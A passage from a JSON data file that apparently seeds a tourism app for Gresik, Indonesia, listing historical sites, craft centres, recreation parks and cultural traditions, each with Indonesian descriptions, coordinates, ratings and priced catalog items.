                "description": "Masjid agung baru berkonsep arsitektur ramah lingkungan tanpa AC di wilayah Gresik Selatan, dikelilingi taman hijau.",
                "coords": [
                    -7.285,
                    112.595
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c43_1",
                        "name": "Sumbangan Pohon Teduh",
                        "price": 50000,
                        "description": "Waqaf bibit pohon ketapang kencana untuk halaman masjid."
                    }
                ]
            },
            {
                "id": "m44",
                "name": "Situs Sejarah Giri Kedaton",
                "owner": "Pengelola Dinas Pariwisata",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Situs arkeologi pusat kerajaan Islam pertama di Jawa yang didirikan oleh Sunan Giri, menawarkan panorama kota Gresik dari atas bukit.",
                "coords": [
                    -7.1812,
                    112.6322
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c44_1",
                        "name": "Tiket Masuk Domestik",
                        "price": 5000,
                        "description": "Akses ke situs cagar budaya Giri Kedaton."
                    }
                ]
            },
            {
                "id": "m45",
                "name": "Kampung Kemasan (Kampung Heritage)",
                "owner": "Yayasan Pelestari Kota Tua Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1604999333679-b86d54738315?auto=format&fit=crop&w=600&q=80",
                "description": "Kompleks pemukiman kuno berarsitektur campuran Eropa, Cina, dan Jawa dengan dinding bata merah megah peninggalan abad 19.",
                "coords": [
                    -7.1562,
                    112.6558
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c45_1",
                        "name": "Tiket Keliling Kampung Heritage",
                        "price": 10000,
                        "description": "Tiket masuk area konservasi rumah bata merah antik."
                    }
                ]
            },
            {
                "id": "m46",
                "name": "Gedung Gajah Mungkur",
                "owner": "Keluarga Ahli Waris H. Oemar",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1564507592333-c60657eea523?auto=format&fit=crop&w=600&q=80",
                "description": "Rumah antik legendaris bergaya indis kolonial dengan pintu jendela raksasa abad 19, milik saudagar pribumi terkaya.",
                "coords": [
                    -7.155,
                    112.656
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c46_1",
                        "name": "Tiket Masuk Gedung Kolonial",
                        "price": 15000,
                        "description": "Akses eksplorasi interior rumah kolonial tempo dulu."
                    }
                ]
            },
            {
                "id": "m47",
                "name": "Situs Gosari Ujungpangkah",
                "owner": "Dinas Cagar Budaya Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs arkeologi industri gerabah kuno peninggalan zaman Majapahit abad ke-13 yang dilengkapi prasasti batu tulis.",
                "coords": [
                    -6.911,
                    112.523
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c47_1",
                        "name": "Edukasi Gerabah Gosari",
                        "price": 15000,
                        "description": "Tiket terusan wisata sejarah gerabah kuno dan taman bunga."
                    }
                ]
            },
            {
                "id": "m48",
                "name": "Kompleks Pecinan Kuno Gresik",
                "owner": "Komunitas Tionghoa Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Deretan rumah toko antik dengan atap melengkung khas Tiongkok selatan abad 18 yang membentang di jalan perdagangan lama.",
                "coords": [
                    -7.1565,
                    112.661
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c48_1",
                        "name": "Peta Digital Heritage Walk",
                        "price": 5000,
                        "description": "Akses peta dan penjelasan audio panduan jalan kota tua Pecinan."
                    }
                ]
            },
            {
                "id": "m49",
                "name": "Kawasan Kolonial Bandar Grissee",
                "owner": "Pemkab Gresik Heritage",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1604999333679-b86d54738315?auto=format&fit=crop&w=600&q=80",
                "description": "Revitalisasi dermaga dan loji tua kolonial Belanda tempat perdagangan rempah dunia pesisir utara Gresik.",
                "coords": [
                    -7.1525,
                    112.6635
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c49_1",
                        "name": "Panduan Buku Sejarah Pelabuhan",
                        "price": 40000,
                        "description": "Buku eksklusif sejarah emas Pelabuhan Bandar Grissee."
                    }
                ]
            },
            {
                "id": "m50",
                "name": "Situs Sumur Gemuling",
                "owner": "Dinas Kepurbakalaan",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1564507592333-c60657eea523?auto=format&fit=crop&w=600&q=80",
                "description": "Sumur batu kuno peninggalan zaman Majapahit yang dikeramatkan, dahulu merupakan tempat mengambil air wudhu para wali.",
                "coords": [
                    -7.171,
                    112.6295
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c50_1",
                        "name": "Air Botol Sumur Keramat",
                        "price": 5000,
                        "description": "Air mineral botolan murni bersumber dari Sumur Gemuling."
                    }
                ]
            },
            {
                "id": "m51",
                "name": "Benteng Lodewijk Mengare",
                "owner": "BPCB Jawa Timur",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Reruntuhan benteng militer rancangan Daendels tahun 1808 di semenanjung Mengare, pertahanan utama pintu masuk Surabaya.",
                "coords": [
                    -7.012,
                    112.622
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c51_1",
                        "name": "Tiket Sejarah Benteng Lodewijk",
                        "price": 10000,
                        "description": "Retribusi kelestarian cagar budaya reruntuhan benteng."
                    }
                ]
            },
            {
                "id": "m52",
                "name": "Kampung Arab Gresik (Kawasan Gapura)",
                "owner": "Masyarakat Arab Gapura",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Kawasan pemukiman imigran Hadramaut abad 17 dengan arsitektur rumah tinggi pintu melengkung, kental nuansa Timur Tengah.",
                "coords": [
                    -7.1582,
                    112.655
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c52_1",
                        "name": "Sewa Gamis Arab Tradisional",
                        "price": 30000,
                        "description": "Penyewaan busana Arab untuk keperluan foto dokumentasi."
                    }
                ]
            },
            {
                "id": "m53",
                "name": "Prasasti Leran",
                "owner": "Museum Sejarah Leran",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1604999333679-b86d54738315?auto=format&fit=crop&w=600&q=80",
                "description": "Situs replika batu tulisan prasasti penanda kepurbakalaan awal pemukiman muslim pertama Leran abad ke-11.",
                "coords": [
                    -7.1265,
                    112.6042
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c53_1",
                        "name": "Tiket Edukasi Prasasti",
                        "price": 5000,
                        "description": "Tiket masuk museum mini situs cagar prasasti Leran."
                    }
                ]
            },
            {
                "id": "m54",
                "name": "Situs Purbakala Kaliwowo",
                "owner": "BPCB Jatim Kelompok Kaliwowo",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1564507592333-c60657eea523?auto=format&fit=crop&w=600&q=80",
                "description": "Situs struktur bata merah kuno peninggalan abad 14 yang diduga merupakan kompleks pertapaan pendeta Hindu-Buddha.",
                "coords": [
                    -7.215,
                    112.565
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c54_1",
                        "name": "Tur Edukasi Candi Kaliwowo",
                        "price": 20000,
                        "description": "Tur berpemandu menyelidiki arsitektur candi bata merah."
                    }
                ]
            },
            {
                "id": "m55",
                "name": "Makam Poesponegoro",
                "owner": "Keluarga Sentana Poesponegoro",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Pemakaman bupati pertama Gresik Kyai Tumenggung Poesponegoro (1669-1703 M) dengan nisan ukir relief bermotif bunga.",
                "coords": [
                    -7.1592,
                    112.6565
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c55_1",
                        "name": "Buku Silsilah Bupati Gresik",
                        "price": 30000,
                        "description": "Buku dokumen silsilah silsilah penguasa dinasti Poesponegoro."
                    }
                ]
            },
            {
                "id": "m56",
                "name": "Tugu Pahlawan Gresik (Kawasan Alun-Alun)",
                "owner": "Legiun Veteran RI Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Monumen peringatan perlawanan rakyat Gresik mengusir tentara sekutu NICA tahun 1945, landmark perjuangan kota.",
                "coords": [
                    -7.157,
                    112.656
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c56_1",
                        "name": "Buku Saku Perang Medan Gresik",
                        "price": 15000,
                        "description": "Buku sejarah pertempuran 10 November 1945 di wilayah Gresik."
                    }
                ]
            },
            {
                "id": "m57",
                "name": "Situs Lingga Yoni Benjeng",
                "owner": "Pokdarwis Benjeng Heritage",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1604999333679-b86d54738315?auto=format&fit=crop&w=600&q=80",
                "description": "Penemuan batu Lingga dan Yoni kuno di tepi sawah, pertanda suburnya peradaban agraris Hindu kuno Gresik Selatan.",
                "coords": [
                    -7.241,
                    112.512
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c57_1",
                        "name": "Retribusi Foto Cagar Budaya",
                        "price": 5000,
                        "description": "Izin dokumentasi non komersial di area lingga yoni."
                    }
                ]
            },
            {
                "id": "m58",
                "name": "Sumur Songo Sidayu",
                "owner": "Masyarakat Sidayu Heritage",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1564507592333-c60657eea523?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sembilan titik sumur tua peninggalan kolonial Kadipaten Sidayu abad 18 yang tidak pernah kering walau kemarau panjang.",
                "coords": [
                    -6.983,
                    112.562
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c58_1",
                        "name": "Tur Keliling Sumur Songo",
                        "price": 10000,
                        "description": "Tur berpemandu menyusuri sembilan sumur kuno Sidayu."
                    }
                ]
            },
            {
                "id": "m59",
                "name": "Sentra Kerajinan Songkok Bungah",
                "owner": "Koperasi Songkok Bungah",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1441986300917-64674bd600d8?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat produsen Songkok (Peci) beludru hitam terbaik nasional yang dikerjakan secara hand-made presisi tinggi.",
                "coords": [
                    -7.061,
                    112.599
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c59_1",
                        "name": "Songkok Beludru Premium",
                        "price": 75000,
                        "description": "Peci beludru hitam anti-air ukuran standar dewasa."
                    }
                ]
            },
            {
                "id": "m60",
                "name": "Kampung Batik Wedani (Cerme)",
                "owner": "Koperasi Batik Wedani",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1528698827591-e19ccd7bc23d?auto=format&fit=crop&w=600&q=80",
                "description": "Desa wisata produsen kain sarung tenun ATBM (Alat Tenun Bukan Mesin) bermotif batik khas Gresik yang diekspor ke Timur Tengah.",
                "coords": [
                    -7.211,
                    112.585
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c60_1",
                        "name": "Sarung Tenun Wedani Sutra",
                        "price": 350000,
                        "description": "Sarung tenun sutra ATBM kualitas ekspor motif goyor."
                    }
                ]
            },
            {
                "id": "m61",
                "name": "Pasar Bandeng Tradisional Gresik",
                "owner": "Dinas Pasar Gresik",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Pasar malam tahunan menjelang Lebaran yang memamerkan hasil lelang ikan bandeng jumbo budidaya tambak Gresik.",
                "coords": [
                    -7.1555,
                    112.6575
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c61_1",
                        "name": "Bandeng Lelang Jumbo (1 Kg)",
                        "price": 85000,
                        "description": "Ikan bandeng super ukuran besar segar langsung dari tambak."
                    }
                ]
            },
            {
                "id": "m62",
                "name": "Pusat Oleh-oleh Sari Kelapa",
                "owner": "Ibu Hajah Salamah",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Toko pusat oleh-oleh terlengkap khas Gresik, menjual pudak, jubung, otok-otok, keripik ikan payus, dan sirup sinom segar.",
                "coords": [
                    -7.1612,
                    112.651
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c62_1",
                        "name": "Paket Oleh-oleh Hemat",
                        "price": 100000,
                        "description": "Paket bundling pudak, jubung, dan keripik payus renyah."
                    }
                ]
            },
            {
                "id": "m63",
                "name": "Sentra Kerajinan Rebana & Bedug Bungah",
                "owner": "Pak Haji Sholihin",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1441986300917-64674bd600d8?auto=format&fit=crop&w=600&q=80",
                "description": "Pengrajin alat musik hadrah, rebana jepara, dan bedug kulit sapi berkualitas tinggi yang dipasarkan hingga Malaysia.",
                "coords": [
                    -7.058,
                    112.602
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c63_1",
                        "name": "Satu Set Rebana Hadrah (4 Pcs)",
                        "price": 1200000,
                        "description": "Hadrah beludru ukir kayu mangga premium lengkap tas jinjing."
                    }
                ]
            },
            {
                "id": "m64",
                "name": "Gresik Trade Center (GTC)",
                "owner": "Menejemen Mal GTC",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1528698827591-e19ccd7bc23d?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat perbelanjaan retail modern pertama di Gresik, menyediakan fashion, bioskop, arena bermain, dan pujasera kuliner lokal.",
                "coords": [
                    -7.149,
                    112.628
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c64_1",
                        "name": "Voucher Bermain Game GTC",
                        "price": 50000,
                        "description": "Kartu isi saldo bermain 20 wahana permainan anak."
                    }
                ]
            },
            {
                "id": "m65",
                "name": "Sentra Kerajinan Emas Manyar",
                "owner": "Paguyuban Pengusaha Emas Manyar",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat toko emas perhiasan tradisional buatan tangan pengrajin Manyar, terkenal dengan karat murni dan desain ukir antik.",
                "coords": [
                    -7.112,
                    112.595
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c65_1",
                        "name": "Cincin Emas Ukir (1 Gram)",
                        "price": 950000,
                        "description": "Cincin emas kadar 22 karat motif ukir bunga Manyar."
                    }
                ]
            },
            {
                "id": "m66",
                "name": "Pasar Senggol GKB",
                "owner": "Paguyuban Pedagang Kaki Lima",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Pasar kaget kuliner dan fashion murah meriah yang buka setiap hari Minggu pagi di sepanjang jalan utama perumahan GKB.",
                "coords": [
                    -7.142,
                    112.635
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c66_1",
                        "name": "Kaos Souvenir Grestrip",
                        "price": 35000,
                        "description": "Kaos katun sablon ikon wisata Gresik ukuran all size."
                    }
                ]
            },
            {
                "id": "m67",
                "name": "Oleh-oleh Bandeng Pak Elan I",
                "owner": "Keluarga Pak Elan",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1441986300917-64674bd600d8?auto=format&fit=crop&w=600&q=80",
                "description": "Toko oleh-oleh bandeng tanpa duri legendaris yang menyediakan bandeng asap, bandeng presto, dan otak-otak matang siap bawa pulang.",
                "coords": [
                    -7.1628,
                    112.6465
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c67_1",
                        "name": "Bandeng Presto Gurih (Isi 2)",
                        "price": 50000,
                        "description": "Satu kotak bandeng presto duri lunak plus sambal cobek pedas."
                    }
                ]
            },
            {
                "id": "m68",
                "name": "Sentra Anyaman Bambu Balongpanggang",
                "owner": "Koperasi Bambu Lestari",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1528698827591-e19ccd7bc23d?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat anyaman bambu tradisional memproduksi besek, tudung saji, tampah, dan keranjang belanja ramah lingkungan.",
                "coords": [
                    -7.285,
                    112.455
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c68_1",
                        "name": "Tudung Saji Bambu Estetik",
                        "price": 45000,
                        "description": "Tudung saji rajutan bambu wulung halus diameter 50cm."
                    }
                ]
            },
            {
                "id": "m69",
                "name": "Taman Rekreasi Edukasi Dinasti",
                "owner": "PT Dinasti Nusantara",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana rekreasi air keluarga terbesar di pusat Gresik Kota Baru (GKB), dilengkapi kolam ombak buatan dan seluncuran spiral raksasa.",
                "coords": [
                    -7.142,
                    112.639
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c69_1",
                        "name": "Tiket Masuk Waterpark",
                        "price": 35000,
                        "description": "Tiket terusan seluruh kolam renang waterpark Dinasti."
                    }
                ]
            },
            {
                "id": "m70",
                "name": "Wisata Alam Gosari (Wagos)",
                "owner": "Karang Taruna Gosari",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Taman rekreasi modern di atas perbukitan kapur utara Gresik, menyajikan taman bunga menawan, jembatan merah, dan gazebo eropa.",
                "coords": [
                    -6.912,
                    112.524
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c70_1",
                        "name": "Tiket Masuk Wagos",
                        "price": 15000,
                        "description": "Tiket masuk per orang menikmati spot foto selfie Wagos."
                    }
                ]
            },
            {
                "id": "m71",
                "name": "Gresik Techno Park",
                "owner": "Bappeda Gresik",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Taman bermain interaktif bertema sains dan teknologi masa kini untuk mengedukasi anak-anak tentang dunia robotik.",
                "coords": [
                    -7.168,
                    112.628
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c71_1",
                        "name": "Tiket Eksperimen Sains",
                        "price": 20000,
                        "description": "Akses masuk ruang simulasi gempa, VR, dan robotika."
                    }
                ]
            },
            {
                "id": "m72",
                "name": "Taman Putri Kaca Piring GKB",
                "owner": "Dinas Lingkungan Hidup",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "RTH (Ruang Terbuka Hijau) asri ramah anak dengan mainan pasir pantai, jogging track sejuk, dan kolam ikan terapi.",
                "coords": [
                    -7.145,
                    112.641
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c72_1",
                        "name": "Pakan Ikan Hias (1 Cup)",
                        "price": 3000,
                        "description": "Satu wadah kecil pelet pakan ikan koi kolam taman."
                    }
                ]
            },
            {
                "id": "m73",
                "name": "Edu-Wisata Lontar Sewu",
                "owner": "BUMDes Hendrosari",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Taman bermain buatan di tengah kebun pohon lontar yang rindang, terkenal dengan wahana sepeda layang, kereta api mini, dan bebek air.",
                "coords": [
                    -7.251,
                    112.565
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c73_1",
                        "name": "Tiket Terusan 5 Wahana",
                        "price": 40000,
                        "description": "Tiket terusan murah menaiki bianglala, sepeda layang, dll."
                    }
                ]
            },
            {
                "id": "m74",
                "name": "Taman Bundaran GKB (Pujasera & Rekreasi)",
                "owner": "Paguyuban Kuliner GKB",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Titik temu rekreasi kuliner malam hari yang dipadati puluhan stan makanan kekinian dan wahana istana balon anak.",
                "coords": [
                    -7.1462,
                    112.636
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c74_1",
                        "name": "Sewa Sepatu Roda (30 Menit)",
                        "price": 15000,
                        "description": "Sewa sepatu roda anak lengkap dengan pelindung lutut."
                    }
                ]
            },
            {
                "id": "m75",
                "name": "Wisata Kampung Kelir Manyar",
                "owner": "Karang Taruna Manyar",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Perkampungan nelayan Manyar yang dihias cat warna-warni kontras di pinggir dermaga kapal, sangat fotogenik dikunjungi.",
                "coords": [
                    -7.108,
                    112.583
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c75_1",
                        "name": "Tiket Masuk Kampung Kelir",
                        "price": 5000,
                        "description": "Retribusi kebersihan per orang masuk dermaga kampung kelir."
                    }
                ]
            },
            {
                "id": "m76",
                "name": "Water Boom Sidayu Nusantara",
                "owner": "Pokdarwis Sidayu Sejahtera",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Kolam renang permainan air ramah kantong di wilayah utara Gresik, dipadati keluarga saat akhir pekan.",
                "coords": [
                    -6.989,
                    112.569
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c76_1",
                        "name": "Tiket Masuk Waterboom Sidayu",
                        "price": 15000,
                        "description": "Tiket masuk berenang hari Sabtu/Minggu."
                    }
                ]
            },
            {
                "id": "m77",
                "name": "Taman Pramuka Kebomas",
                "owner": "Kwarcab Gerakan Pramuka Gresik",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Hutan pinus buatan di bukit Kebomas yang sering dijadikan arena kemah outbound pramuka dan gathering kantor.",
                "coords": [
                    -7.178,
                    112.612
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c77_1",
                        "name": "Sewa Paket Outbound Training",
                        "price": 50000,
                        "description": "Sewa flying fox, tali titian, dan instruktur pemandu outbound."
                    }
                ]
            },
            {
                "id": "m78",
                "name": "Alun-Alun Kota Gresik",
                "owner": "Dinas Perumahan & Kawasan Permukiman",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat rekreasi tengah kota berupa plaza bertingkat dengan arsitektur masjid agung, taman asri, dan kuliner melimpah.",
                "coords": [
                    -7.1572,
                    112.6562
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c78_1",
                        "name": "Wahana Odong-odong Alun-alun",
                        "price": 5000,
                        "description": "Naik kereta odong-odong keliling kawasan alun-alun 2 putaran."
                    }
                ]
            },
            {
                "id": "m79",
                "name": "Desa Wisata Tenun Wedani",
                "owner": "BUMDes Wedani",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Desa penghasil kain tenun tradisional di mana pengunjung dapat mempraktikkan cara menenun sarung goyor secara langsung.",
                "coords": [
                    -7.212,
                    112.584
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c79_1",
                        "name": "Workshop Belajar Menenun (1 Jam)",
                        "price": 50000,
                        "description": "Edukasi intensif cara mengoperasikan alat tenun manual ATBM."
                    }
                ]
            },
            {
                "id": "m80",
                "name": "Seni Tari Pencak Macan Lumpur",
                "owner": "Paguyuban Seni Lumpur",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Padepokan kesenian khas pesisir Gresik berupa sendratari pencak silat berkostum loreng harimau pelestari budaya.",
                "coords": [
                    -7.168,
                    112.659
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c80_1",
                        "name": "Tiket Pertunjukan Kesenian",
                        "price": 15000,
                        "description": "Akses menonton sendratari silat macan lumpur pada perayaan desa."
                    }
                ]
            },
            {
                "id": "m81",
                "name": "Seni Musik Terbang Jidur Bungah",
                "owner": "Grup Hadrah Jidur Bungah",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Padepokan musik kolaborasi rebana besar (Jidur) dan tiupan terompet selompret khas timur tengah akulturasi budaya.",
                "coords": [
                    -7.056,
                    112.592
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c81_1",
                        "name": "CD Album Hadrah Jidur",
                        "price": 30000,
                        "description": "CD rekaman audio musik hadrah sholawat jidur Bungah asli."
                    }
                ]
            },
            {
                "id": "m82",
                "name": "Upacara Adat Sanggring Kolak Ayam Sembayat",
                "owner": "Panitia Adat Masjid Sembayat",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Tradisi kuliner khas Sembayat memasak kolak ayam peninggalan Sunan Dalem abad 16 yang dipercaya menyembuhkan penyakit.",
                "coords": [
                    -7.025,
                    112.569
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c82_1",
                        "name": "Satu Porsi Kolak Ayam Suci",
                        "price": 15000,
                        "description": "Satu mangkuk kolak ayam suwiran rasa manis rempah gurih jahe."
                    }
                ]
            },
            {
                "id": "m83",
                "name": "Kampung Damar Kurung",
                "owner": "Keluarga Mbah Masmundari Heritage",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Desa penghasil lampion kertas lukis tradisional (Damar Kurung) pelestari warisan legendaris seniman Mbah Masmundari.",
                "coords": [
                    -7.163,
                    112.6515
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c83_1",
                        "name": "Damar Kurung Lukis Asli (Ukuran S)",
                        "price": 45000,
                        "description": "Lampion damar kurung dari bambu dan kertas minyak lukis tangan."
                    }
                ]
            },
            {
                "id": "m84",
                "name": "Tradisi Rebo Wekasan Suci",
                "owner": "Masyarakat Adat Desa Suci",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Upacara adat tasyakuran meminum air dari sendang (mata air) kuno masjid Suci penolak bala di rabu terakhir bulan shofar.",
                "coords": [
                    -7.135,
                    112.615
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c84_1",
                        "name": "Botol Air Zikir Suci (PP)",
                        "price": 5000,
                        "description": "Air sendang purba Suci yang telah didoakan para kiai desa."
                    }
                ]
            },
            {
                "id": "m85",
                "name": "Seni Tari Damar Kurung",
                "owner": "Sanggar Seni Tari Kembang Sore",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Sanggar latihan pertunjukan kreasi tari berpasangan bertema kegembiraan lampion damar kurung yang dinamis.",
                "coords": [
                    -7.152,
                    112.648
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c85_1",
                        "name": "Tiket Nonton Kelas Tari",
                        "price": 10000,
                        "description": "Izin menonton latihan tari damar kurung sanggar kembang sore."
                    }
                ]
            },
            {
                "id": "m86",
                "name": "Desa Pembuat Kerajinan Anyaman Lontar",
                "owner": "Karang Taruna Hendrosari",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Kampung budaya pembuat topi, tikar, tas, dan kipas berbahan baku daun pohon siwalan (lontar) khas pesisir.",
                "coords": [
                    -7.248,
                    112.562
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c86_1",
                        "name": "Topi Koboi Daun Lontar",
                        "price": 25000,
                        "description": "Topi anyaman daun lontar kuat tahan panas matahari."
                    }
                ]
            },
            {
                "id": "m87",
                "name": "Tradisi Sanggring Bawean",
                "owner": "Lembaga Adat Bawean",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Festival seni bela diri tradisional Bawean mirip pencak silat namun diiringi tabuhan musik melayu kasidah wangi gesek.",
                "coords": [
                    -5.795,
                    112.658
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c87_1",
                        "name": "Tiket Festival Sanggring Bawean",
